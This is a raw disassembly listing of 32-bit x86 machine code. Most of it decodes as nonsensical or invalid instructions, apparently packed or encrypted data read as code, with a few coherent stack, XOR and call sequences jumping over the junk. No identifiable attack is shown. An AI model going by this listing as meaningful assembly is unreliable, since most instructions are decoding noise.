  419aca:	stos   DWORD PTR es:[edi],eax
  419acb:	in     eax,dx
  419acc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419acd:	ja     0x419ac2
  419acf:	pop    esi
  419ad0:	pop    eax
  419ad1:	sbb    DWORD PTR [edx+0x251bdb2c],esp
  419ad7:	(bad)  
  419ad9:	nop
  419ada:	loopne 0x419aae
  419adc:	int    0xf1
  419ade:	sub    DWORD PTR [ecx],ebp
  419ae0:	push   ecx
  419ae1:	pop    eax
  419ae2:	mov    al,bh
  419ae4:	ret    0xfb4e
  419ae7:	and    esp,DWORD PTR [eax-0x3b92f4ab]
  419aed:	push   0xc628fea8
  419af2:	cmc    
  419af3:	cli    
  419af4:	xor    al,0xfd
  419af6:	in     eax,dx
  419af7:	scas   eax,DWORD PTR es:[edi]
  419af8:	mov    eax,0x42a51759
  419afd:	adc    BYTE PTR [ecx+0x6c89d66],ah
  419b03:	in     eax,dx
  419b04:	call   0x2e5bebd7
  419b09:	xchg   esi,eax
  419b0a:	or     BYTE PTR [esi+0x4fafbf90],ch
  419b10:	retf   0x23d2
  419b13:	xor    DWORD PTR [ebx+0x1d567286],esi
  419b19:	mov    dl,0xa3
  419b1b:	inc    esp
  419b1c:	loop   0x419af0
  419b1e:	cs div edx
  419b21:	or     DWORD PTR [edi-0x17c50b4a],eax
  419b27:	das    
  419b28:	(bad)  
  419b29:	call   0x9e8e9267
  419b2e:	mov    cl,0x6a
  419b30:	clc    
  419b31:	sar    bl,1
  419b33:	and    ebp,esi
  419b35:	scas   eax,DWORD PTR es:[edi]
  419b36:	mov    eax,DWORD PTR [ebx-0x2]
  419b39:	mov    ds:0xbb5c19a2,al
  419b3e:	fld    DWORD PTR [ecx]
  419b40:	adc    BYTE PTR [edi+ecx*4+0x71],dh
  419b44:	cdq    
  419b45:	pop    edx
  419b46:	sub    BYTE PTR [eax+0x2122ca2d],ch
  419b4c:	xor    al,ah
  419b4e:	ins    BYTE PTR es:[edi],dx
  419b4f:	loopne 0x419b72
  419b51:	add    edi,DWORD PTR [edx]
  419b53:	retf   0xbbe
  419b56:	sub    DWORD PTR [eax-0x4ee459a0],0x2b
  419b5d:	cld    
  419b5e:	jp     0x28d2771b
  419b64:	adc    al,0x94
  419b66:	push   cs
  419b67:	and    cl,BYTE PTR [edx]
  419b69:	or     eax,0xdc973ce3
  419b6e:	inc    esp
  419b6f:	mov    eax,ds:0x5baa0d7f
  419b74:	mov    ch,0x11
  419b76:	pop    ecx
  419b77:	cld    
  419b78:	call   0x9e123c00
  419b7d:	xchg   edi,eax
  419b7e:	pop    ss
  419b7f:	ror    BYTE PTR [ebx+0x39428e31],1
  419b85:	ret    0xc078
  419b88:	fsub   QWORD PTR [ebp-0x6b55b09b]
  419b8e:	sbb    ecx,DWORD PTR cs:[edx+ecx*2]
  419b92:	push   ds
  419b93:	mov    eax,0xc9d03fef
  419b98:	mov    ah,0x37
  419b9a:	pop    ebx
  419b9b:	cld    
  419b9c:	cwde   
  419b9d:	mov    esp,0x1e19a586
  419ba2:	in     al,dx
  419ba3:	or     ebp,DWORD PTR [eax-0x76]
  419ba6:	xchg   bh,ah
  419ba8:	sub    BYTE PTR [esi],ch
  419baa:	inc    eax
  419bab:	mov    BYTE PTR [eax-0x29],bh
  419bae:	sahf   
  419baf:	arpl   WORD PTR [eax],dx
  419bb1:	ror    BYTE PTR [esi-0x71],0x3f
  419bb5:	and    eax,0x569a8395
  419bba:	dec    ebp
  419bbb:	ja     0x419b4c
  419bbd:	clc    
  419bbe:	mov    eax,ds:0xc01119b4
  419bc3:	push   ebp
  419bc4:	and    DWORD PTR [ecx+eiz*8-0x41],0xce9d36ec
  419bcc:	in     al,0x30
  419bce:	sub    BYTE PTR [ebx],bl
  419bd0:	repnz xor dh,dl
  419bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd4:	or     ch,dl
  419bd6:	inc    eax
  419bd7:	dec    edi
  419bd8:	dec    ecx
  419bd9:	cld    
  419bda:	mov    esi,0x4eab3999
  419bdf:	data16 lods al,BYTE PTR ds:[esi]
  419be1:	enter  0x831b,0x60
  419be5:	fiadd  WORD PTR [ecx-0x58]
  419be8:	jecxz  0x419b8f
  419bea:	sbb    DWORD PTR [ebx-0x16],esi
  419bed:	cs es mov ebx,ebx
  419bf1:	cmp    al,0x47
  419bf3:	into   
  419bf4:	push   esp
  419bf5:	sar    DWORD PTR [esi+0x18],0x20
  419bf9:	fidivr DWORD PTR [esp+edx*8+0x1326605]
  419c00:	cmp    esp,ebx
  419c02:	sahf   
  419c03:	mov    esp,0xac85a89c
  419c08:	leave  
  419c09:	aas    
  419c0a:	pop    ds
  419c0b:	jno    0x419c60
  419c0d:	and    bh,BYTE PTR [edi-0x7939dbbb]
  419c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c14:	stos   DWORD PTR es:[edi],eax
  419c15:	aaa    
  419c16:	repz mov eax,0x364b5265
  419c1c:	mul    BYTE PTR [ebx+0x68e8f66]
  419c22:	shl    DWORD PTR [eax],0xa4
  419c25:	into   
  419c26:	jo     0x815e80e1
  419c2c:	mov    gs,edx
  419c2e:	mov    ebx,0x7d984395
  419c33:	(bad)  
  419c34:	fld    TBYTE PTR [ebp+0x67]
  419c37:	xchg   ebp,eax
  419c38:	inc    edx
  419c39:	xchg   edi,eax
  419c3a:	mov    ecx,0x752a2b11
  419c3f:	adc    DWORD PTR [edi+0x598a2e3],edx
  419c45:	sub    DWORD PTR [eax],esi
  419c47:	or     edi,DWORD PTR [edx]
  419c49:	hlt    
  419c4a:	and    DWORD PTR [ecx+0x49],eax
  419c4d:	mov    ah,0x3c
  419c4f:	jecxz  0x419c85
  419c51:	add    DWORD PTR [esi-0x59593520],esi
  419c57:	jbe    0x419c47
  419c59:	pop    eax
  419c5a:	jl     0x419c34
  419c5c:	test   DWORD PTR [ebx+ebp*8-0x6e5b4a90],esi
  419c63:	xor    BYTE PTR [eax+0x16],dh
  419c66:	hlt    
  419c67:	aad    0x76
  419c69:	xchg   ecx,eax
  419c6a:	pop    edx
  419c6b:	pop    ds
  419c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c6d:	arpl   WORD PTR [ebx+0x4e],dx
  419c70:	hlt    
  419c71:	mov    ah,0x1
  419c73:	es push edx
  419c75:	push   0xf40036db
  419c7a:	stos   DWORD PTR es:[edi],eax
  419c7b:	stos   BYTE PTR es:[edi],al
  419c7c:	stc    
  419c7d:	push   cs
  419c7e:	jecxz  0x419c7c
  419c80:	and    al,0x21
  419c82:	daa    
  419c83:	mov    edi,0x73be22e2
  419c88:	test   eax,0x16b515fb
  419c8d:	dec    esp
  419c8e:	daa    
  419c8f:	inc    esi
  419c90:	ins    BYTE PTR es:[edi],dx
  419c91:	cmp    al,0xe8
  419c93:	xchg   ecx,eax
  419c94:	mul    BYTE PTR [eax-0x33]
  419c97:	inc    esp
  419c98:	lahf   
  419c99:	cdq    
  419c9a:	adc    al,BYTE PTR [edx+0x8]
  419c9d:	loopne 0x419d03
  419c9f:	les    ebx,FWORD PTR [ebp-0x4f37f32c]
  419ca5:	and    cl,dl
  419ca7:	sbb    DWORD PTR [eax],edx
  419ca9:	sub    al,0xf1
  419cab:	mov    al,ds:0x39ad7405
  419cb0:	sbb    ah,BYTE PTR [eax+0x644c1f3c]
  419cb6:	xchg   BYTE PTR [ecx-0x5f92e707],cl
  419cbc:	xchg   DWORD PTR [eax-0x2948eacc],ebp
  419cc2:	repnz fisttp QWORD PTR [ebx-0x4a]
  419cc6:	ja     0x419cd2
  419cc8:	cmp    al,0x60
  419cca:	(bad)  
  419ccc:	std    
  419ccd:	lods   eax,DWORD PTR ds:[esi]
  419cce:	div    DWORD PTR [eax+edx*2+0x58]
  419cd2:	cmp    edi,DWORD PTR [ebx+0x50]
  419cd5:	jg     0x419d03
  419cd7:	mov    ss,WORD PTR [edx]
  419cd9:	mov    edx,ss
  419cdb:	sar    dl,1
  419cdd:	xor    bh,0x46
  419ce0:	xor    eax,ebx
  419ce2:	xor    DWORD PTR [eax+0x58],esp
  419ce5:	jmp    0xbcc:0xed40437f
  419cec:	xchg   DWORD PTR [esi-0x68708aad],ebx
  419cf2:	fist   DWORD PTR [esi-0x45052e54]
  419cf8:	push   cs
  419cf9:	popa   
  419cfa:	leave  
  419cfb:	(bad)  
  419cfc:	fild   DWORD PTR [edi-0x1551d023]
  419d02:	add    eax,0x4b54cbca
  419d07:	push   edi
  419d08:	cdq    
  419d09:	sar    ebp,cl
  419d0b:	adc    ah,BYTE PTR [esi+0x64]
  419d0e:	enter  0xc1d0,0xf6
  419d12:	sub    ecx,DWORD PTR [ebp-0x31f1460d]
  419d18:	sbb    cl,ch
  419d1a:	rcl    DWORD PTR [esi+0x27],1
  419d1d:	pop    ecx
  419d1e:	daa    
  419d1f:	inc    esi
  419d20:	test   al,0x1
  419d22:	mov    ebx,fs
  419d24:	sbb    cl,al
  419d26:	fidiv  WORD PTR [eax+0x40575e52]
  419d2c:	les    esp,FWORD PTR [edi+0x3]
  419d2f:	push   0x93e7c
  419d34:	inc    eax
  419d35:	jno    0x419d31
  419d37:	popf   
  419d38:	popf   
  419d39:	jne    0x419cfd
  419d3b:	aad    0xf6
  419d3d:	fwait
  419d3e:	pusha  
  419d3f:	push   edi
  419d40:	jo     0x419dad
  419d42:	loop   0x419cc9
  419d44:	push   ebp
  419d45:	mov    ecx,0xfe747b18
  419d4a:	icebp  
  419d4b:	hlt    
  419d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d4d:	adc    eax,0xb379b983
  419d52:	sbb    eax,0xffffffae
  419d55:	mov    ebp,0xda4d316
  419d5a:	xor    eax,ecx
  419d5c:	lods   eax,DWORD PTR ds:[esi]
  419d5d:	gs mov bl,0xf1
  419d60:	sbb    BYTE PTR [ecx],ch
  419d62:	shr    BYTE PTR [edi],0xe9
  419d65:	and    bl,BYTE PTR [ebp-0x4f31e76]
  419d6b:	sub    ebp,DWORD PTR [eax+0x65]
  419d6e:	ins    BYTE PTR es:[edi],dx
  419d6f:	fwait
  419d70:	test   DWORD PTR [eax+0x15dc76c4],ebp
  419d76:	mov    ebp,0x73a9a8f3
  419d7b:	jle    0x419d54
  419d7d:	out    dx,al
  419d7e:	test   eax,0xeb03de5b
  419d83:	scas   eax,DWORD PTR es:[edi]
  419d84:	in     al,0xb6
  419d86:	(bad)  
  419d87:	cs inc ebx
  419d89:	xchg   edx,eax
  419d8a:	div    DWORD PTR [edi+0x4c]
  419d8d:	lea    esi,[esi+eax*4-0x4e]
  419d91:	mov    ah,0x42
  419d93:	test   al,0x23
  419d95:	xor    eax,0x6df4c821
  419d9a:	and    eax,ebx
  419d9c:	or     bh,ch
  419d9e:	mov    edi,0x1d3c4be8
  419da3:	jmp    0x419e00
  419da5:	pop    eax
  419da6:	sub    al,0x95
  419da8:	test   al,0x11
  419daa:	dec    eax
  419dab:	mul    eax
  419dad:	xor    BYTE PTR [ebx],al
  419daf:	cmp    BYTE PTR ss:[edx-0x8],dh
  419db3:	sub    al,0xbb
  419db5:	clc    
  419db6:	ins    BYTE PTR es:[edi],dx
  419db7:	lods   eax,DWORD PTR ds:[esi]
  419db8:	stos   DWORD PTR es:[edi],eax
  419db9:	std    
  419dba:	sub    edi,esp
  419dbc:	fisttp QWORD PTR ds:[ebx-0x52]
  419dc0:	or     al,0x6b
  419dc2:	jno    0x419d89
  419dc4:	add    al,0x9
  419dc6:	ss sub ebx,ebp
  419dc9:	cmp    dh,dh
  419dcb:	cmp    al,0x6f
  419dcd:	pop    esi
  419dce:	aam    0xa5
  419dd0:	and    BYTE PTR [ecx+0x7c8a02c8],dl
  419dd6:	push   edi
  419dd7:	mov    ebp,0xb98cb230
  419ddc:	xor    eax,0xb7a56e90
  419de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419de2:	aaa    
  419de3:	adc    DWORD PTR [ebx-0x8a062af],edi
  419de9:	sbb    DWORD PTR ds:0x205860a3,0x70b4297f
  419df3:	loop   0x419e6f
  419df5:	add    edx,DWORD PTR [eax-0x191d7e63]
  419dfb:	push   ebx
  419dfc:	sub    eax,0x7fa73252
  419e01:	add    ah,BYTE PTR [ebx+0x677a06e7]
  419e07:	imul   eax,ebp,0x717a5b54
  419e0d:	jge    0x419dd7
  419e0f:	pop    ebx
  419e10:	mov    ds:0x96b4912,eax
  419e15:	icebp  
  419e16:	loope  0x419dd2
  419e18:	arpl   WORD PTR [edx+esi*1-0x108e3dc4],bx
  419e1f:	pop    eax
  419e20:	dec    eax
  419e21:	mov    edi,0xdfe86d97
  419e26:	sti    
  419e27:	jge    0x419e07
  419e29:	iret   
  419e2a:	dec    ecx
  419e2b:	addr16 pop eax
  419e2d:	test   eax,0x4ddd88a6
  419e32:	cli    
  419e33:	and    DWORD PTR es:[edx-0x75],eax
  419e37:	dec    esp
  419e38:	and    al,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x7edb9a4a
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	mov    bh,0x57
  419e70:	sub    ecx,edi
  419e72:	inc    ebx
  419e73:	pop    ds
  419e74:	test   eax,0x3ad0e85a
  419e79:	jle    0x419e6d
  419e7b:	xor    ebx,DWORD PTR [esi+0x51]
  419e7e:	mov    ds:0xd3804b69,al
  419e83:	and    eax,0xc01c7aaf
  419e88:	dec    edx
  419e89:	inc    edx
  419e8a:	ins    DWORD PTR es:[edi],dx
  419e8b:	jmp    0x419eed
  419e8d:	std    
  419e8e:	adc    DWORD PTR [ebx+0x4],esp
  419e91:	test   al,0x44
  419e93:	repz out 0xf2,al
  419e96:	dec    edi
  419e97:	cmp    al,0x1e
  419e99:	xor    ah,bl
  419e9b:	clc    
  419e9c:	cdq    
  419e9d:	xchg   DWORD PTR [edx],esi
  419e9f:	popf   
  419ea0:	enter  0x9346,0x24
  419ea4:	pop    eax
  419ea5:	fs xchg edi,eax
  419ea7:	pusha  
  419ea8:	or     BYTE PTR [edi+0x62],ch
  419eab:	sub    DWORD PTR [esi],esp
  419ead:	dec    eax
  419eae:	mov    al,0x7f
  419eb0:	xchg   esi,eax
  419eb1:	jno    0x419ebf
  419eb3:	repz bound esp,QWORD PTR [esi+0x27]
  419eb7:	mov    edi,0x151d0ac3
  419ebc:	add    ah,0xd6
  419ebf:	sub    BYTE PTR gs:[ebx-0x7],bl
  419ec3:	fwait
  419ec4:	mul    DWORD PTR ds:0xe4676862
  419eca:	sbb    BYTE PTR [edx-0x79ab5e21],bl
  419ed0:	mov    eax,ds:0xe9102999
  419ed5:	mov    al,ds:0xe3a01250
  419eda:	aas    
  419edb:	es out 0x2a,eax
  419ede:	inc    esp
  419edf:	mov    ecx,0x6c90253c
  419ee4:	(bad)  
  419ee6:	push   esi
  419ee7:	(bad)  
  419ee8:	leave  
  419ee9:	les    edi,FWORD PTR [ecx+edi*1-0x16772585]
  419ef0:	jle    0x419f5c
  419ef2:	add    DWORD PTR [edi],eax
  419ef4:	(bad)
  419ef7:	sub    DWORD PTR [edx],eax
  419ef9:	add    edx,edx
  419efb:	fucomi st,st(3)
  419efd:	scas   eax,DWORD PTR es:[edi]
  419efe:	rcl    DWORD PTR [ebx-0x13cc2830],0xbd
  419f05:	pop    ebx
  419f06:	xchg   DWORD PTR [edi],esp
  419f08:	fidiv  WORD PTR [ecx+ebp*8+0xe]
  419f0c:	lods   eax,DWORD PTR ds:[esi]
  419f0d:	(bad)  
  419f0e:	push   esi
  419f0f:	ret    0x142b
  419f12:	xchg   ebp,eax
  419f13:	pop    eax
  419f14:	js     0x419f14
  419f16:	sbb    dl,ch
  419f18:	cmc    
  419f19:	in     al,0x70
  419f1b:	shl    BYTE PTR [ebp+0x1e],0x38
  419f1f:	lods   eax,DWORD PTR ds:[esi]
  419f20:	mov    edx,0x8a11a8df
  419f25:	mov    eax,ds:0xbe9ed445
  419f2a:	or     DWORD PTR [ebp-0x7f],0x7
  419f2e:	inc    ebp
  419f2f:	xor    esi,DWORD PTR [ebx-0x5e622426]
  419f35:	repnz nop
  419f37:	sbb    bh,BYTE PTR [edx*2-0xfebd50]
  419f3e:	je     0x419f22
  419f40:	adc    BYTE PTR [ebp-0x4a9b9f19],0x9b
  419f47:	fwait
  419f48:	add    edx,DWORD PTR ds:0x4cb8af76
  419f4e:	mov    DWORD PTR [ecx-0x31],eax
  419f51:	aaa    
  419f52:	das    
  419f53:	adc    DWORD PTR [ebp+0x10e0d21a],0xb3ff0e71
  419f5d:	mov    esp,0x6c9c4504
  419f62:	pop    eax
  419f63:	daa    
  419f64:	not    BYTE PTR [ecx]
  419f66:	std    
  419f67:	mov    ch,0xbc
  419f69:	add    DWORD PTR [esi-0x4b],ecx
  419f6c:	jo     0x419fd2
  419f6e:	dec    ebp
  419f6f:	loopne 0x419f7a
  419f71:	jo     0x419f23
  419f73:	adc    DWORD PTR [ebx],0xf6c31c2f
  419f79:	test   al,0x2e
  419f7b:	lock icebp 
  419f7d:	loopne 0x419fa5
  419f7f:	pop    eax
  419f80:	dec    si
  419f82:	test   BYTE PTR [eax],ah
  419f84:	push   esi
  419f85:	loope  0x419fde
  419f87:	mov    ecx,0x1aa47d85
  419f8c:	popf   
  419f8d:	sub    ah,BYTE PTR [eax]
  419f8f:	test   al,0x2a
  419f91:	push   0x52
  419f93:	jl     0x45eed5e3
  419f99:	(bad)  
  419f9a:	stos   BYTE PTR es:[edi],al
  419f9b:	sti    
  419f9c:	jne    0x419f3a
  419f9e:	or     BYTE PTR [ebp+0x11],ah
  419fa1:	shr    DWORD PTR [ecx],cl
  419fa3:	push   eax
  419fa4:	hlt    
  419fa5:	or     cl,bl
  419fa7:	aam    0x6b
  419fa9:	push   ds
  419faa:	jg     0x419f46
  419fac:	sbb    eax,0x1dd9f4bc
  419fb1:	clc    
  419fb2:	out    dx,eax
  419fb3:	jno    0x419f55
  419fb5:	ficomp WORD PTR [edi-0x17]
  419fb8:	dec    ebp
  419fb9:	adc    edi,esi
  419fbb:	imul   edx,DWORD PTR [ebx-0x67],0xfffffff1
  419fbf:	jbe    0x41a012
  419fc1:	dec    edx
  419fc2:	adc    al,0x51
  419fc4:	sbb    ch,BYTE PTR [edx+0x21c12cb6]
  419fca:	imul   ebx,DWORD PTR [edi],0xa9df3d4d
  419fd0:	pop    eax
  419fd1:	cmp    BYTE PTR [edi+0x68],cl
  419fd4:	sub    ch,al
  419fd6:	cmp    ah,BYTE PTR [esi-0x72]
  419fd9:	daa    
  419fda:	mov    ah,bl
  419fdc:	xchg   edi,eax
  419fdd:	sub    al,0x3a
  419fdf:	clc    
  419fe0:	mov    WORD PTR [ecx+0x7134a857],ds
  419fe6:	ret    
  419fe7:	clc    
  419fe8:	(bad)  
  419fea:	dec    edx
  419feb:	cmp    BYTE PTR [ebx],dh
  419fed:	dec    ecx
  419fee:	mov    ah,0x31
  419ff0:	test   eax,0xecb4c1be
  419ff5:	sti    
  419ff6:	push   edi
  419ff7:	or     al,0xad
  419ff9:	and    al,0x83
  419ffb:	fild   QWORD PTR [ebx]
  419ffd:	mov    esp,0xdf8fa226
  41a002:	scas   al,BYTE PTR es:[edi]
  41a003:	mov    DWORD PTR [esi-0x1058e2ef],esp
  41a009:	daa    
  41a00a:	inc    esp
  41a00b:	std    
  41a00c:	mov    ch,0xaf
  41a00e:	repz add BYTE PTR [eax],0xf4
  41a012:	scas   al,BYTE PTR es:[edi]
  41a013:	inc    BYTE PTR [esi-0x1f]
  41a016:	push   0xffffffdd
  41a018:	lock inc edx
  41a01a:	bound  eax,QWORD PTR [edx-0x575ecdc1]
  41a020:	loope  0x419fb4
  41a022:	ror    DWORD PTR [edi+0x68],0xf0
  41a026:	test   al,0xfc
  41a028:	push   esi
  41a029:	mov    ds:0xefb895d6,al
  41a02e:	stos   DWORD PTR es:[edi],eax
  41a02f:	dec    ecx
  41a030:	adc    DWORD PTR [eax-0x1d],ebp
  41a033:	adc    bl,bh
  41a035:	in     eax,0x4
  41a037:	fisttp WORD PTR [edx+0x10fd36d6]
  41a03d:	inc    ecx
  41a03e:	sbb    cl,BYTE PTR [edi-0x659a6d8e]
  41a044:	inc    ebp
  41a045:	test   BYTE PTR [ebp+ebp*1+0x3b],dl
  41a049:	jne    0x41a03c
  41a04b:	inc    ebx
  41a04c:	mov    dl,0x27
  41a04e:	push   edi
  41a04f:	cmp    ecx,DWORD PTR [ebx-0x21]
  41a052:	hlt    
  41a053:	in     al,0x73
  41a055:	fldcw  WORD PTR [eax-0x37e23478]
  41a05b:	xchg   BYTE PTR [eax-0x36],ah
  41a05e:	fisubr WORD PTR [ecx+0x798fafea]
  41a064:	bound  esp,QWORD PTR [ecx+0x4]
  41a067:	lds    esp,FWORD PTR ds:0xacb44c4f
  41a06d:	cmp    al,0x24
  41a06f:	push   cs
  41a070:	mov    ebp,DWORD PTR [ecx]
  41a072:	loopne 0x41a0c0
  41a074:	pop    ss
  41a075:	(bad)  
  41a076:	or     edx,DWORD PTR [eax+0x2b0b93f8]
  41a07c:	push   eax
  41a07d:	jp     0x41a017
  41a07f:	(bad)  
  41a080:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41a082:	or     al,0x4c
  41a084:	push   ecx
  41a085:	xor    ch,BYTE PTR [ecx]
  41a087:	fisub  DWORD PTR [ecx]
  41a089:	aas    
  41a08a:	xchg   ebx,eax
  41a08b:	out    dx,eax
  41a08c:	fidiv  WORD PTR [edi+0x34]
  41a08f:	idiv   DWORD PTR [esi-0x4abd0ec3]
  41a095:	xor    bh,BYTE PTR [edi-0x7102cbbb]
  41a09b:	mov    cl,0x23
  41a09d:	pop    es
  41a09e:	dec    ebp
  41a09f:	enter  0x57c5,0x35
  41a0a3:	jb     0x41a029
  41a0a5:	repnz loope 0x41a098
  41a0a8:	arpl   WORD PTR [ebp-0x887813e],bx
  41a0ae:	test   esi,edx
  41a0b0:	test   BYTE PTR [edi+0x7d],bl
  41a0b3:	and    eax,0x26fe13f0
  41a0b8:	adc    bl,BYTE PTR [esi-0x51]
  41a0bb:	les    ebx,FWORD PTR [bx+di]
  41a0be:	js     0x41a077
  41a0c0:	outs   dx,DWORD PTR ds:[esi]
  41a0c1:	mov    dh,0x91
  41a0c3:	lahf   
  41a0c4:	sub    BYTE PTR [ebp-0x18],bh
  41a0c7:	push   edx
  41a0c8:	push   ds
  41a0c9:	xor    eax,0xdb6e3d75
  41a0cf:	sub    BYTE PTR [esi],al
  41a0d1:	into   
  41a0d2:	(bad)  
  41a0d3:	ffree  st(7)
  41a0d5:	cld    
  41a0d6:	into   
  41a0d7:	mov    dl,0x3a
  41a0d9:	mov    bh,BYTE PTR [edx]
  41a0db:	adc    al,0xf4
  41a0dd:	pop    esp
  41a0de:	adc    eax,0x38368636
  41a0e3:	push   0xffffffc5
  41a0e5:	and    ebx,eax
  41a0e7:	sahf   
  41a0e8:	and    ebx,DWORD PTR [ebx]
  41a0ea:	xchg   DWORD PTR [edi],edx
  41a0ec:	xlat   BYTE PTR ds:[ebx]
  41a0ed:	imul   ebx,ebx,0x1e69db20
  41a0f3:	(bad)  
  41a0f4:	or     ch,BYTE PTR [eax+eiz*2+0x5b]
  41a0f8:	add    edi,DWORD PTR [edx]
  41a0fa:	pop    ds
  41a0fb:	lods   al,BYTE PTR ds:[esi]
  41a0fc:	(bad)  
  41a0fd:	mov    bl,0xe1
  41a0ff:	icebp  
  41a100:	sbb    edi,DWORD PTR [esi+0x204810f]
  41a106:	cmp    ecx,DWORD PTR [ebp-0x1e23ff45]
  41a10c:	xor    dl,BYTE PTR [eax-0x72509cec]
  41a112:	push   es
  41a113:	and    DWORD PTR [edx+ebx*8],ebx
  41a116:	retf   0x6d89
  41a119:	dec    eax
  41a11a:	cmp    DWORD PTR [ecx-0x50],esi
  41a11d:	mov    ds:0x13abcc77,eax
  41a122:	pop    ebx
  41a123:	push   ebp
  41a124:	ret    0x2fed
  41a127:	std    
  41a128:	ja     0x41a1a7
  41a12a:	xchg   esi,eax
  41a12b:	popa   
  41a12c:	sub    cl,BYTE PTR [edx]
  41a12e:	inc    ecx
  41a12f:	imul   edi,ecx,0x51
  41a132:	test   BYTE PTR [edx-0x6a],0x39
  41a136:	in     al,0xa7
  41a138:	(bad)  
  41a13a:	sbb    ebp,0x8230cd08
  41a140:	dec    ebx
  41a141:	adc    DWORD PTR [ebp-0x4e],eax
  41a144:	imul   esi,DWORD PTR [eax+eiz*4-0x68c80640],0xffffffd2
  41a14c:	jno    0x41a0e1
  41a14e:	adc    DWORD PTR [ebp-0x13],ebp
  41a151:	inc    edx
  41a152:	and    al,0x6b
  41a154:	cmp    al,0x48
  41a156:	call   0x7c675cab
  41a15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a15c:	cs aas 
  41a15e:	mov    edx,0x969a4f86
  41a163:	mov    ch,0x16
  41a165:	pop    ebx
  41a166:	lea    ebp,[ebp-0x24]
  41a169:	mov    ecx,0x508476bb
  41a16e:	nop
  41a16f:	shl    al,0x5f
  41a172:	jo     0x41a1b6
  41a174:	xor    BYTE PTR [edx],ch
  41a176:	push   edx
  41a177:	lahf   
  41a178:	scas   al,BYTE PTR es:[edi]
  41a179:	lock adc BYTE PTR [edx+eiz*8],dh
  41a17d:	xchg   esp,eax
  41a17e:	aad    0x4a
  41a180:	popa   
  41a181:	adc    al,0x1c
  41a183:	data16 sti 
  41a185:	inc    ebx
  41a186:	pop    eax
  41a187:	clc    
  41a188:	cwde   
  41a189:	rcl    DWORD PTR [eax-0x71c9d60b],0x77
  41a190:	mov    dl,0x92
  41a192:	inc    ebp
  41a193:	or     esi,DWORD PTR [edi]
  41a195:	data16 jns 0x41a166
  41a198:	cld    
  41a199:	jbe    0x41a1f6
  41a19b:	stos   DWORD PTR es:[edi],eax
  41a19c:	lds    esp,FWORD PTR [edi]
  41a19e:	je     0x41a21f
  41a1a0:	icebp  
  41a1a1:	mov    dl,0x41
  41a1a3:	js     0x41a215
  41a1a5:	pop    es
  41a1a6:	(bad)  
  41a1a7:	sahf   
  41a1a8:	ds test eax,ebp
  41a1ab:	(bad)  
  41a1ac:	loopne 0x41a18e
  41a1ae:	push   0x73eb502d
  41a1b3:	cli    
  41a1b4:	xlat   BYTE PTR es:[ebx]
  41a1b6:	sahf   
  41a1b7:	mov    esi,0xd6edd9f9
  41a1bc:	aad    0x91
  41a1be:	cwde   
  41a1bf:	cli    
  41a1c0:	cmp    eax,0x11f61a66
  41a1c5:	test   eax,0xbec77237
  41a1ca:	mov    al,0x5e
  41a1cc:	xchg   esi,eax
  41a1cd:	ret    0xe468
  41a1d0:	adc    DWORD PTR [edi],edx
  41a1d2:	push   es
  41a1d3:	push   edx
  41a1d4:	scas   eax,DWORD PTR es:[edi]
  41a1d5:	mov    esi,0x38504c74
  41a1da:	xchg   BYTE PTR [esi-0x60],cl
  41a1dd:	add    cl,ch
  41a1df:	mov    BYTE PTR [esi-0x6ceb0e9d],ch
  41a1e5:	xchg   edi,eax
  41a1e6:	inc    edi
  41a1e7:	loop   0x41a16b
  41a1e9:	daa    
  41a1ea:	push   0x9
  41a1ec:	shr    BYTE PTR [eax+0x754842d6],cl
  41a1f2:	inc    edi
  41a1f3:	adc    eax,0x1be43b21
  41a1f8:	cmp    DWORD PTR [ecx+0x4d],ebx
  41a1fb:	add    BYTE PTR [eax+0x3c],bh
  41a1fe:	imul   ebp,edi,0x62aa9d09
  41a204:	retf   0xf9b0
  41a207:	pushf  
  41a208:	push   eax
  41a209:	rcr    DWORD PTR [edx],cl
  41a20b:	enter  0x6f03,0x50
  41a20f:	jge    0x41a214
  41a211:	mov    BYTE PTR [edx+0x46],bh
  41a214:	(bad)  
  41a215:	mov    al,0xf6
  41a217:	lods   al,BYTE PTR ds:[esi]
  41a218:	dec    ebx
  41a219:	ja     0x41a1f0
  41a21b:	imul   esi,eax,0xffffff92
  41a21e:	xchg   edx,eax
  41a21f:	mov    ah,BYTE PTR ds:0x325d
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	push   ss
